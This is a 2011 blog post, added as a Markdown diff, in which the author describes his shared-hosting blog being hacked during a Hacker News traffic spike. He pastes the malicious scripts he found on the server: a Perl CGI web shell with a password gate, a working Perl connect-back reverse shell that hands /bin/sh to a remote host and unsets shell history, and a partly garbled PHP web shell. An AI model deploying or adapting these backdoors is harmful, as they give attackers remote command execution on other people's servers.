@@ -1,0 +1,394 @@
+---
+layout: post
+title: 'Being hacked killed a 6k traffic spike on my blog yesterday'
+date: 2011-05-06
+categories: 'Uncategorized'
+author: Swizec Teller
+hero: ../../../defaultHero.jpg
+---
+\[caption id="" align="alignright" width="300" caption="Image via Wikipedia"][![Visual analytics practice](http://upload.wikimedia.org/wikipedia/commons/thumb/4/43/Visual_analytics_practice.jpg/300px-Visual_analytics_practice.jpg "Visual analytics practice")](http://commons.wikipedia.org/wiki/File:Visual_analytics_practice.jpg)\[/caption]
+
+
+
+Yesterday I wrote a blog [boldly proclaiming one shouldn't be a quiet professional](http://swizec.com/blog/dont-be-a-quiet-professional/swizec/1707 "Don’t be a quiet professional"). I felt it wasn't very inspired and lacked a certain amount of substance, but the internet apparently had a different idea of its value.
+
+
+
+All it took to get it on the frontpage of [HackerNews](http://news.ycombinator.com/ "Hacker News") was posting the link on twitter ... usually I have to beg, plead and promise sexual favours to people on IRC so they'd read my links and give them an upvote or two.
+
+
+
+Happy day!
+
+
+
+And it was going pretty well too until a few moments later I get a "call" from someone living on the same server as this blog ... "Your blog got hacked dude, you were killing the server, you're killed"
+
+
+
+The what now?
+
+
+
+By this time the link was thriving on frontpage and was gaining upvotes like a madman, even after it started throwing a 403 to everyone trying to read it was still gaining upvotes and from the best of my observations it was among the top five for at least an hour. Eventually it fell off the frontpage completely, but some people were still sharing the link around on twitter because they had apparently opened it hours ago before sharing.
+
+## Consequences
+
+The consequences of being hacked are pretty simple: a lot of frustration on my part.
+
+
+
+The more \\important consequences have to do with the fact I use this blog to drive traffic to hipstervision.org via that big link on the left and I use hipstervision to get job offers because it's currently the shiniest product I have to show. It actually works.
+
+
+
+On top of that, I'm a total numbers geek. If I see a number, I want to make it better. Google analytics are that sort of number, I just love seeing those graphs go up.
+
+
+
+So here's the deal, [Google Analytics](http://www.google.com/analytics "Google Analytics") says 1584 people came to read my blog yesterday. Pretty good right?
+
+
+
+Well, running a simple grep on yesterday's logs says that **6268**were shown an ugly 403 error.
+
+
+
+Six. Fucking. Thousand! That's more than I get in an average month (hey this is just a lame blog, I'm not used to traffic). And certainly not all of those were actual people but different spiders and automated things, but still, even if just half of those requests came from real people that's a pretty sucky thing to have happen.
+
+
+
+I wonder how many would come if they could actually read the post ... some of them might like it enough to share it, some more might upvote it ... oh the possibilities are endless here.
+
+## Wtf happened
+
+To be honest, I don't know exactly what happened. The sysadmin says my blog was causing a load of 70+, which I think is sysadmin talk for "trying to use 70-times more resources than are available" and was killing the server. He took a quick look, saw weird scripts on my account, and promptly killed everything.
+
+
+
+He said thousands of requests per second were being made with my account, which is just odd. HN is popular, but not _that_ popular.
+
+
+
+I can't say I know when or why those scripts made it onto the server, creation times reported were somewhere around january ... why they would get activated at this particular time, is a mystery ...
+
+
+
+Not entirely certain there's a lesson in all of this, being hacked just plain sucks and there's never a good time for going through such an affair.
+
+
+
+Just to feed curiosity, and for future reference of sorts, here are the scripts I found laying about my home dir.
+
+
+
+This was in the cgi-bin directory, now this directory doesn't exist anymore
+
+```
+#!/usr/bin/perl
+use strict;
+use CGI::Carp qw(warningsToBrowser fatalsToBrowser);
+use CGI qw(:standard escapeHTML);
+
+my $vers = "BUTAS 1.1 TRME";
+my $pwd  = "BvR/DtaeLh5zw";
+my $salt = substr($pwd, 0, 2);
+my $ipwd = param("pwd");
+my $epwd = crypt($ipwd, $salt);
+my $npwd = crypt("", $salt);
+my $cid2 = cookie("cid");
+my $cid;
+my $msg  = " ";
+my $command;
+my $takbo;
+my $lihim;
+my $result;
+
+$0="[khvcd]";
+
+sub URLEncode {
+  my $theURL = $_[0];
+  $theURL =~ s/([\W])/"%" . uc(sprintf("%2.2x",ord($1)))/eg;
+  return $theURL;
+}
+
+if ($pwd eq $epwd) {
+  $cid  = cookie(-name=>"cid", -value=>"1");
+  $cid2 = "1";
+}
+
+if ($epwd ne $npwd) {
+  $msg = "
+
+
+
+Mukha Mo!
+
+
+";
+}
+
+if (!($cid)) {
+  $cid = cookie( -name=>"cid", -value=>"0" );
+}
+
+$cid  = cookie(-name=>"cid", -value=>$cid2);
+
+print header( -COOKIE=>$cid ), start_html($vers);
+
+if ($cid2 ne "1") {
+  print $msg;
+  print start_form();
+  print "The magic word is ";
+  print textfield( -name=>"pwd", -size=>"100");
+  print submit(-name=> 'submit_form', -value    => 'Submit',);
+  print end_form;
+  print end_html;
+  exit(0);
+}
+
+print start_form();
+
+if (param()){
+  $command = param("command");
+  $takbo   = param("takbo");
+  $lihim   = param("lihim");
+}
+
+print "
+
+$vers
+
+
+\n";
+print "
+
+\n
+
+Input
+
+\n\n";
+print "EXEC: ";
+print textfield( -name=>"takbo", -size=>"20", -value=>$takbo,);
+print "\n";
+print "PASS: ";
+print textfield( -name=>"lihim", -size=>"20", -value=>$lihim,);
+print "\n
+\n";
+print "Your Command ";
+print textfield( -name=>"command", -size=>"100", -value=>"");
+print "\n";
+print submit(-name=> 'submit_form', -value    => 'Submit Command',);
+
+print "\n\n
+
+
+\n";
+
+if (param()){
+  my $order;
+
+  $command = param("command");
+  $takbo   = param("takbo");
+  $lihim   = param("lihim");
+
+  if  (($takbo ne "") && ($lihim ne "")) {
+    $order = $takbo ." " . $lihim . " " . URLEncode($command);
+  } else {
+    $order = $command;
+  }
+
+  $result  = `$order`;
+
+  my $outtxt = "$result\n";
+
+  print "\n\n
+
+\n\t
+
+Output
+
+\n\t";
+  print '';
+  print "\n";
+  print "$outtxt";
+  print "\n\t\n
+
+
+\n";
+
+}
+print "\n";
+print end_form;
+print "\n\n\n";
+print end_html;
+```
+
+These two were just laying about on their own
+
+```
+#!/usr/bin/perl
+use IO::Socket;
+#IRAN HACKERS SABOTAGE Connect Back Shell
+#code by:LorD
+#We Are :LorD-C0d3r-NT
+#
+#lord@SlackwareLinux:/home/programing$ perl dc.pl
+#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--
+#
+#Usage: dc.pl [Host] [Port]
+#
+#Ex: dc.pl 127.0.0.1 2121
+#lord@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121
+#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--
+#
+#[*] Resolving HostName
+#[*] Connecting... 127.0.0.1
+#[*] Spawning Shell
+#[*] Connected to remote host
+
+#bash-2.05b# nc -vv -l -p 2121
+#listening on [any] 2121 ...
+#connect to [127.0.0.1] from localhost [127.0.0.1] 2121
+#--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--
+#
+#--==Systeminfo==--
+#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux
+#
+#--==Userinfo==--
+#uid=1001(lord) gid=100(users) groups=100(users)
+#
+#--==Directory==--
+#/root
+#
+#--==Shell==--
+#
+$system	= '/bin/sh';
+$ARGC=@ARGV;
+print "--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==-- \n\n";
+if ($ARGC!=2) {
+   print "Usage: $0 [Host] [Port] \n\n";
+   die "Ex: $0 127.0.0.1 2121 \n";
+}
+use Socket;
+use FileHandle;
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
+connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
+print "[*] Resolving HostName\n";
+print "[*] Connecting... $ARGV[0] \n";
+print "[*] Spawning Shell \n";
+print "[*] Connected to remote host \n";
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT,">&SOCKET");
+open(STDERR,">&SOCKET");
+print "--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--  \n\n";
+system("unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo;
+echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- ");
+system($system);
+#EOF????? ??????
+```
+
+And a really interesting game.php
+
+```
+' . "\n";
+?>
+
+  HELP <?php echo HELP_VERSION ?>
+
+HELP 
+
+
+
+
+
+
+
+
+
+
+Input
+
+Current working directory: 
+Root/';
+
+if (!empty($work_dir_splitted[0])) {
+  $path = '';
+  for ($i = 0; $i < count($work_dir_splitted); $i++) {
+    $path .= '/' . $work_dir_splitted[$i];
+    printf('%s/',
+           $_SERVER['PHP_SELF'],
+           urlencode($path),
+           $work_dir_splitted[$i]);
+  }
+}
+
+?>
+
+    EXEC: 
+    PASS: 
+    Choose new working directory:
+
+
+Current Directory\n";
+    } elseif ($dir == '..') {      if (strlen($work_dir) == 1) {
+      } elseif (strrpos($work_dir, '/') == 0) {
+      echo "Parent Directory\n";
+      } else {
+      echo "Parent Directory\n";
+      }
+    } else {
+      if ($work_dir == '/') {
+        echo "$dir\n";
+      } else {
+        echo "$dir\n";
+      }
+    }
+  }
+}
+closedir($dir_handle);?>
+
+
+Command: 
+Enable stderr-trapping?
+ />
+
+
+ 
+
+
+ 
+
+
+
+Output
+
+<?php function shell_exec2($cmd){   if (!empty($cmd)){     $fp = popen($cmd,"r");     {       $result = "";       while(!feof($fp)){$result.=fread($fp,1024);}       pclose($fp);     }   }   return convert_cyr_string($result,"d","w"); } if (!empty($command)) {   if ($stderr) {     $tmpfile = tempnam('/tmp', 'ses_6r');     $command .= " > $tmpfile 2>&1; cat $tmpfile; rm $tmpfile";
+  } elseif ($command == 'ls') {
+    $command .= ' -F';
+  }</p>  if (!empty($takbo) && !empty($lihim)) {
+    $mycommand = $takbo . " " . $lihim . " ";
+  }</p>  if (!empty($mycommand)) {
+    $mycommand .= urlencode($command);
+  } else {
+    $mycommand = $command;
+  }</p>  echo htmlspecialchars(shell_exec2($mycommand), ENT_COMPAT, 'UTF-8');
+}
+?>
+
+
+ 
+
+
+ 
+```
+
+###### Related articles
+
+- [Adventures in Solo Blogging: The First 100,000 Pageviews](http://newsgrange.com/adventures-in-solo-blogging-the-first-100000-pageviews/) (newsgrange.com)
+- [Checking that firewalls are opened](http://supermaninthemiddle.wordpress.com/2011/05/05/checking-that-firewalls-are-opened/) (supermaninthemiddle.wordpress.com)
+- [A TCP Proxy in Perl](http://www.catonmat.net/blog/perl-tcp-proxy) (catonmat.net)
+- [Hacking Hacker News Headlines](http://metamarketsgroup.com/blog/hacking-hacker-news-headlines/) (metamarketsgroup.com)
+
+[![Enhanced by Zemanta](http://img.zemanta.com/zemified_e.png?x-id=f0c42271-7735-4eb6-a88f-5eba9fa48cad)](http://www.zemanta.com/ "Enhanced by Zemanta")
